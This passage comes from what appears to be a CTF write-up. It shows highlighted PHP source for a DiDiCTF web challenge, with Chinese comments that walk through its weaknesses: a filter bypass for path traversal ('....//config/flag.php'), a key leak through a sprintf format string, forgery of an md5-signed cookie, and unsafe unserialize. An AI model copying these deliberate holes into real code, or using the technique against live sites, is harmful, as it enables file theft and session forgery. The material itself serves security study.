style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eempty\u003c/span\u003e($_SERVER[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;\u003c/span\u003e]) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e $_SERVER[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e $DIDICTF_ADMIN) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTRUE\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;抱歉，您没有登陆权限，请获取权限后访问-----\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esanitizepath\u003c/span\u003e($path) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  $path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrim\u003c/span\u003e($path);\u003cspan style=\"color:#75715e\"\u003e//去掉空格\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  $path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estr_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;../\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,$path);\u003cspan style=\"color:#75715e\"\u003e//过滤第一\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  $path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estr_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;..\\\\\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,$path);\u003cspan style=\"color:#75715e\"\u003e//过滤第二\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e $path;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\u003cspan style=\"color:#75715e\"\u003e//\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e __destruct() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eempty\u003c/span\u003e($this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esanitizepath\u003c/span\u003e($this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e);\u003cspan style=\"color:#75715e\"\u003e// ....//config/flag.php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003estrlen\u003c/span\u003e($path) \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e) {\u003cspan style=\"color:#75715e\"\u003e//../config/flag.php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e          \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e($data\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e($path),\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Congratulations\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026lt;?php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003einclude \u0026#39;Application.php\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003eclass Session extends Application {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  //key建议为8位字符串\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $eancrykey                  = \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_expiration\t\t\t= 7200;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_name                = \u0026#39;ddctf_id\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_path\t\t\t\t= \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_domain\t\t\t\t= \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_secure\t\t\t\t= FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $activity                   = \u0026#34;DiDiCTF\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  public function index()\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\tif(parent::auth()) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;get_key();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          if($this-\u0026gt;session_read()) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = \u0026#39;DiDI Welcome you %s\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = sprintf($data,$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              parent::response($data,\u0026#39;sucess\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          }else{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $this-\u0026gt;session_create();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = \u0026#39;DiDI Welcome you\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              parent::response($data,\u0026#39;sucess\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  private function get_key() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      //eancrykey  and flag under the folder\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $this-\u0026gt;eancrykey =  file_get_contents(\u0026#39;../config/key.txt\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  public function session_read() {//target1: 绕过所有false\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(empty($_COOKIE)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e           return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//cookie not empty\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $session = $_COOKIE[$this-\u0026gt;cookie_name];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(!isset($session)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#34;session not found\u0026#34;,\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//ddctf_id 不能为空\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if($hash !== md5($this-\u0026gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#34;the cookie data not match\u0026#34;,\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $session = unserialize($session);//ddctf_id 反序列化\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(!is_array($session) OR !isset($session[\u0026#39;session_id\u0026#39;]) OR !isset($session[\u0026#39;ip_address\u0026#39;]) OR !isset($session[\u0026#39;user_agent\u0026#39;])){\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(!empty($_POST[\u0026#34;nickname\u0026#34;])) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $arr = array($_POST[\u0026#34;nickname\u0026#34;],$this-\u0026gt;eancrykey);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $data = \u0026#34;Welcome my friend %s\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          foreach ($arr as $k =\u0026gt; $v) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = sprintf($data,$v);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response($data,\u0026#34;Welcome\u0026#34;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if($session[\u0026#39;ip_address\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#39;the ip addree not match\u0026#39;.\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//ip_address 要写自己的ip\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if($session[\u0026#39;user_agent\u0026#39;] != $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#39;the user agent not match\u0026#39;,\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//user_agent 内容要和 http_user_agent的匹配\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      return TRUE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }//看起来可以动手脚的只有session_id?\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  private function session_create() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $sessionid = \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      while(strlen($sessionid) \u0026lt; 32) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $sessionid .= mt_rand(0,mt_getrandmax());\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $userdata = array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;session_id\u0026#39; =\u0026gt; md5(uniqid($sessionid,TRUE)),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;ip_address\u0026#39; =\u0026gt; 